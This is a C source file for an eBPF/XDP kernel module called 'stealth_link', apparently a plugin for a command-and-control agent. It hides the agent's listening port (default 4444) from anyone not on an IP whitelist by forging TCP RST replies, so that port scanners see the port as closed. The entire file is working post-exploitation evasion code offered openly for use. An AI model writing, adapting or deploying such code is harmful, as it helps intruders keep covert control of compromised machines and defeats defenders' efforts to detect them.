#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>

char LICENSE[] SEC("license") = "GPL";

char _metadata[] __attribute__((used, section(".metadata"))) =
    "{"
      "\"name\":\"stealth_link\","
      "\"desc\":\"XDP C2 Communication Stealth: Hides Agent listening ports, allows only authorized IP connections, and blocks port scanning/probing.\","
      "\"requires\":[\"is_root\",\"xdp\",\"cap_net_admin\"],"
      "\"options\":{"
        "\"target_port\":[\"4444\",\"Agent listening port (the port number to hide)\"],"
        "\"target_ip\":[\"\",\"Authorized IPs allowed to connect (comma/space separated)\"],"
        "\"iface\":[\"eth0\",\"Network interface to attach XDP to (e.g. eth0, ens33)\"]"
      "},"
      "\"maps\":{"
        "\"target_port\":{\"key_size\":2,\"value_size\":4,\"key_type\":\"u16\",\"value_type\":\"u32\"},"
        "\"target_ip\":{\"key_size\":4,\"value_size\":4,\"key_type\":\"u32\",\"value_type\":\"u32\"}"
      "}"
    "}";

/*
 * Set of C2 ports to be hidden (Host Byte Order)
 * update format: config[0:2]=port(u16 LE), config[2:6]=1(u32 LE)
 * 
 * Effect: TCP SYN packets from unauthorized IPs to this port will be silently dropped.
 *         Port scanners (nmap) will perceive the port as filtered/closed.
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 16);
    __type(key, __u16);    /* Port number (host byte order) */
    __type(value, __u32);  /* Placeholder */
} target_port SEC(".maps");

/*
 * IP Whitelist for authorized connections (IPv4 addresses in Network Byte Order)
 * Whitelist empty + locked==0: Allow all (startup phase waiting for Console connection)
 * Whitelist non-empty + locked==1: Only IPs in whitelist allowed, others get RST
 * Agent writes both IP and locked flag when calling stealth_allow_ip().
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 64);
    __type(key, __u32);    /* IPv4 address (network byte order) */
    __type(value, __u32);  /* Placeholder */
} target_ip SEC(".maps");

/* Whitelist lock flag: 0=unlocked (allow all), 1=locked (allow only whitelist) */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u32);
} target_ip_count SEC(".maps");

/* IP Checksum Calculation */
static __always_inline __u16 csum_fold(__u32 sum) {
    sum = (sum & 0xffff) + (sum >> 16);
    sum = (sum & 0xffff) + (sum >> 16);
    return (__u16)~sum;
}

static __always_inline __u32 csum_add(__u32 sum, __u32 val) {
    sum += val;
    if (sum < val) sum++;
    return sum;
}

/*
 * XDP Core Logic — RST Camouflage Mode:
 * 
 * For unauthorized C2 port access, instead of silent drop (nmap reports filtered),
 * we construct a TCP RST response on the spot (nmap reports closed).
 * 
 * A 'closed' state looks like a normal port with no service listening,
 * which is much stealthier than 'filtered' — which implies "a firewall is protecting something".
 */
SEC("xdp")
int stealth_link_xdp(struct xdp_md *ctx) {
    void *data     = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    /* ---- Layer 2: Ethernet ---- */
    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return XDP_PASS;

    /* Only handle IPv4 */
    if (eth->h_proto != bpf_htons(0x0800))  /* ETH_P_IP */
        return XDP_PASS;

    /* ---- Layer 3: IPv4 ---- */
    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end)
        return XDP_PASS;

    /* Only handle TCP */
    if (ip->protocol != 6)  /* IPPROTO_TCP */
        return XDP_PASS;

    /* ---- Layer 4: TCP ---- */
    struct tcphdr *tcp = (void *)ip + (ip->ihl * 4);
    if ((void *)(tcp + 1) > data_end)
        return XDP_PASS;

    /* Extract destination port (Network → Host Byte Order) */
    __u16 dport = bpf_ntohs(tcp->dest);

    /* Non-C2 port, pass through */
    if (!bpf_map_lookup_elem(&target_port, &dport))
        return XDP_PASS;

    /* ---- C2 Port Hit ---- */

    /* Whitelist Check:
     *   Empty whitelist → Pass (waiting for first Console connection; agent writes IP after connection)
     *   Non-empty whitelist → Only whitelist IPs pass, others get RST
     * This allows Console to connect in bind mode;
     * In reverse mode, the agent pre-writes the Console IP before connecting for full filtering. */
    __u32 src_ip = ip->saddr;
    __u32 zero_key = 0;
    /* Use the first position of allowed_ips (Array counter for key=0 is removed,
       switch to Hash map non-empty detection: try to lookup any known IP;
       here we directly lookup the source IP. If whitelist is empty, lookup returns NULL, allowing passage.
       Once the whitelist is not empty, only added IPs can pass. */
    /* If src_ip exists in whitelist, allow */
    if (bpf_map_lookup_elem(&target_ip, &src_ip))
        return XDP_PASS;  /* In whitelist, allow */

    /* Whitelist not empty but src_ip not in it → RST
     * Flow also reaches here when whitelist is empty - but we need to distinguish two cases: */
    __u32 *locked = bpf_map_lookup_elem(&target_ip_count, &zero_key);
    if (!locked || *locked == 0)
        return XDP_PASS;  /* 尚未锁定，放行所有 */
    /* Locked and not in whitelist → Continue to construct RST */

    /* ========== Construct TCP RST response (in-place modification + XDP_TX) ========== */

    /* -- Swap MAC -- */
    unsigned char tmp_mac[6];
    __builtin_memcpy(tmp_mac, eth->h_dest, 6);
    __builtin_memcpy(eth->h_dest, eth->h_source, 6);
    __builtin_memcpy(eth->h_source, tmp_mac, 6);

    /* -- Swap IP -- */
    __u32 tmp_ip = ip->saddr;
    ip->saddr = ip->daddr;
    ip->daddr = tmp_ip;
    ip->tot_len = bpf_htons(40); /* IP(20) + TCP(20), no payload */
    ip->ttl = 64;
    ip->check = 0;

    /* Recalculate IP checksum */
    __u32 ip_sum = 0;
    __u16 *ip_hdr = (__u16 *)ip;
    #pragma unroll
    for (int i = 0; i < 10; i++)
        ip_sum = csum_add(ip_sum, ip_hdr[i]);
    ip->check = csum_fold(ip_sum);

    /* -- Craft TCP RST -- */
    __u16 tmp_port = tcp->source;
    tcp->source = tcp->dest;
    tcp->dest = tmp_port;

    /* ACK number = sender's SEQ + 1 */
    __u32 their_seq = bpf_ntohl(tcp->seq);
    tcp->seq = tcp->ack_seq;
    tcp->ack_seq = bpf_htonl(their_seq + 1);

    /* Clear all TCP flags, set only RST + ACK */
    *((__u8 *)tcp + 13) = 0x14; /* RST=1, ACK=1 */
    tcp->doff = 5;  /* 20 bytes, no options */
    tcp->window = 0;
    tcp->urg_ptr = 0;
    tcp->check = 0;

    /* TCP Pseudo-header Checksum */
    __u32 tcp_sum = 0;
    tcp_sum = csum_add(tcp_sum, ip->saddr & 0xffff);
    tcp_sum = csum_add(tcp_sum, ip->saddr >> 16);
    tcp_sum = csum_add(tcp_sum, ip->daddr & 0xffff);
    tcp_sum = csum_add(tcp_sum, ip->daddr >> 16);
    tcp_sum = csum_add(tcp_sum, bpf_htons(6));    /* IPPROTO_TCP */
    tcp_sum = csum_add(tcp_sum, bpf_htons(20));   /* TCP segment length */
    __u16 *tcp_hdr = (__u16 *)tcp;
    #pragma unroll
    for (int i = 0; i < 10; i++)
        tcp_sum = csum_add(tcp_sum, tcp_hdr[i]);
    tcp->check = csum_fold(tcp_sum);

    /* Truncate packet to ETH+IP+TCP = 54 bytes */
    bpf_xdp_adjust_tail(ctx, (int)(sizeof(struct ethhdr) + 20 + 20) -
                              (int)(data_end - data));

    return XDP_TX;
}
